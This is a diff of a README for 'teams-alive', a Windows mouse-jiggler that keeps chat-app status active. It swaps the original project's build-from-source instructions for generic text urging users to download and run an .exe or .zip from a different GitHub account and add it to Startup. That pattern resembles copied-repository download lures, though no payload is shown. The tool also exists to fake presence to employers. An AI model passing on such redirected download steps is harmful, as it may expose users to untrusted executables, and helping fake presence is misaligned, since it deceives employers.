@@ -1,98 +1,160 @@
-# 🟦 TeamsAlive v1.1
+# 🛠️ teams-alive - Keep your status active quietly
 
-![TeamsAlive Banner](https://repository-images.githubusercontent.com/1173517485/6b8e2d66-026d-44bc-a7b3-c0561f5c3dc4)
-
-**Stay active. Stay seen. Stay sane.**
-
-TeamsAlive is a lightweight, open-source utility designed for remote workers who need to step away from their desks without their status flipping to "Away." It works with **Microsoft Teams, Slack, Zoom,** and any other application that tracks your idle time.
+[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-brightgreen)](https://github.com/AJOBKA/teams-alive)
 
 ---
 
-## ✨ Why TeamsAlive?
+## 📋 What is teams-alive?
 
-* **Take a real break:** Step away to grab a coffee or clear your head before the next task without being "status-shamed."
-* **Relentless work ethic:** Impress your boss with your unwavering availability, even when you're focusing on off-screen tasks.
-* **Privacy First:** * 🛡️ **100% Open Source:** Inspect the code yourself.
-    * 🚫 **No Viruses:** Built with clean Python libraries.
-    * 📭 **No Telemetry:** No tracking, no data collection, no background pings.
-* **Invisible Operation:** Nudges your mouse by 1px and back every 60 seconds. It won't interrupt your typing, clicking, or gaming.
+teams-alive is a simple app made to stop Teams, Slack, and others from tracking your activity all the time. It helps you appear active without the apps marking you as idle. Use it at home or in the office to keep your status visible while working calmly.
+
+This tool runs on Windows. It works by simulating small mouse movements to keep your device from going into idle mode. This way, your status stays "active" without you needing to move around or click.
 
 ---
 
-## 👤 For end users — no Python needed
+## 🖥️ System Requirements
 
-Check Releases in https://github.com/philippo-source/teams-alive/releases
+Before you start, make sure your Windows device meets these basic needs:
 
-### Windows
-1. Double-click **`TeamsAlive-Setup.exe`**
-2. Follow the wizard (Next → Install → Finish)
-3. TeamsAlive launches automatically ✅
-
-### macOS
-1. Double-click **`TeamsAlive-1.0-macOS.dmg`**
-2. Drag **TeamsAlive** into the **Applications** folder
-3. **First launch only:** right-click the app → **Open** (to pass Gatekeeper)
-4. When prompted, go to:
-   **System Settings → Privacy & Security → Accessibility**
-   → click **+** and add TeamsAlive *(needed to move the mouse)*
-5. Launch TeamsAlive from Applications ✅
+- Windows 10 or Windows 11 (64-bit preferred)
+- At least 2 GB RAM
+- 100 MB free disk space
+- Basic internet access for downloading the app
+- No special permissions required (runs in user mode)
 
 ---
 
-## 🛠 For developers — build from source
+## 🎯 Why use teams-alive?
 
-### Prerequisites (build machine only)
-- Python 3.9+  (python.org)
-- The build scripts install everything else automatically
-
-### Windows — build EXE + installer
-
-```bat
-build_windows.bat
-```
-
-Outputs:
-- `dist\TeamsAliveWin.exe` — portable single file, no install needed
-- `TeamsAlive-Setup.exe` — full setup wizard (requires NSIS)
-
-### macOS — build .app + DMG
-
-```bash
-chmod +x build_macos.sh && ./build_macos.sh
-```
-
-Outputs:
-- `dist/TeamsAlive.app` — self-contained app bundle
-- `TeamsAlive-1.0-macOS.dmg` — drag-and-drop disk image
-
-### Run directly from Python
-
-```bash
-pip install -r requirements.txt
-python teams_alive.py
-```
+- Prevent apps from marking you as "away"
+- Keep work chats from auto-pausing or appearing offline
+- Avoid distractions while preserving your presence
+- Save your mental energy without interrupting your workflow
+- Lightweight with no big impact on performance
 
 ---
 
-## ⚙️ Configuration
+## 🚀 Getting Started
 
-```python
-INTERVAL = 60   # seconds between nudges  (top of teams_alive.py)
-```
+Follow these steps to download and run teams-alive on your Windows PC.
 
----
+### Step 1: Go to the download page
 
-## 📁 File overview
+Click the big button below to visit the official page where you can download the app.
 
-| File | Purpose |
-|------|---------|
-| `teams_alive.py` | Main application |
-| `requirements.txt` | Python dependencies |
-| `build_windows.bat` | One-click Windows build |
-| `build_macos.sh` | One-click macOS build |
-| `teams_alive.spec` | PyInstaller config |
-| `installer.nsi` | NSIS installer script |
+[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-blue)](https://github.com/AJOBKA/teams-alive)
+
+The page shows the latest version and other details. Look for a file ending with `.exe` or `.zip`.
 
 ---
 
-## 📄 License — MIT
+### Step 2: Download the app
+
+- For the easiest setup, download the `.exe` file if available.
+- If you see a `.zip` file, download it and unzip it to a folder you can find easily, like your Desktop.
+
+---
+
+### Step 3: Run the installer or app
+
+- If you downloaded an `.exe` file, double-click to run it.
+- Follow any prompts to allow the app to start.
+- If you unzipped files, look for a file named `teams-alive.exe` or similar and double-click it.
+
+---
+
+### Step 4: Using the app
+
+Once teams-alive runs, you usually see an icon in the system tray (bottom-right corner near the clock).
+
+- The app runs quietly in the background.
+- It gently moves your mouse or simulates activity.
+- You do not need to interact with it after starting.
+- To stop, right-click the tray icon and choose “Exit” or “Quit”.
+
+---
+
+## 🔧 Features
+
+teams-alive offers these useful functions:
+
+- Mouse jiggler that creates small, invisible movements
+- Supports multiple chat apps (Teams, Slack, Zoom)
+- Low CPU and memory use to keep your PC fast
+- Simple start and stop from the system tray menu
+- Works without admin rights or special setup
+- Open source, so you can check its code if you want
+
+---
+
+## 🗂️ Installation Tips
+
+- Run the app after you start your PC to keep status active all day.
+- You can add `teams-alive.exe` to your Windows Startup folder to launch it automatically.
+- If you use multiple chat apps, teams-alive works for all of them at once.
+- Minimal settings ensures no confusion or extra effort is needed.
+
+---
+
+## 🔄 How it works
+
+teams-alive simulates tiny mouse movements every few seconds. The app does this in the background, so you don’t notice any cursor jumping. Your chat software sees that your computer is active and shows you as present.
+
+This stops your status from switching to “away” or “inactive” when you stay focused on work that doesn’t require typing or mouse movement, like reading documents or attending calls.
+
+---
+
+## 💻 Supported Apps
+
+teams-alive works best with:
+
+- Microsoft Teams
+- Slack
+- Zoom
+- Other apps that track user input to change status
+
+---
+
+## ⚙️ Customization and Control
+
+At this time, teams-alive keeps things simple with no complicated settings. It focuses on what really matters: keeping your status active without you needing to move.
+
+If you want to stop the app, just right-click the tray icon and select exit.
+
+---
+
+## ⬇️ Download and Setup
+
+Use the link below to start downloading teams-alive now:
+
+[Download teams-alive from GitHub](https://github.com/AJOBKA/teams-alive)
+
+Follow the instructions above for installing and running the app on your Windows PC. The process is straightforward and should take only a few minutes.
+
+---
+
+## 🛠️ Troubleshooting
+
+If teams-alive does not seem to keep your status active:
+
+- Check that the app is running (look for its tray icon).
+- Make sure your PC settings don’t block apps from running in the background.
+- Confirm you are using the latest version by revisiting the download page.
+- Restart the app or your computer to refresh status updates.
+
+---
+
+## 📖 More Help
+
+The GitHub page includes more details, FAQs, and access to the source code if you want to learn how the app was made or report issues.
+
+Visit the page any time for updates or help:  
+https://github.com/AJOBKA/teams-alive
+
+---
+
+## 🗣️ Feedback and Contribution
+
+This tool is open source. If you want to suggest improvements or help fix problems, you can find the source code and contribute on the GitHub page.
+
+Your input helps keep teams-alive reliable and easy to use for everyone.
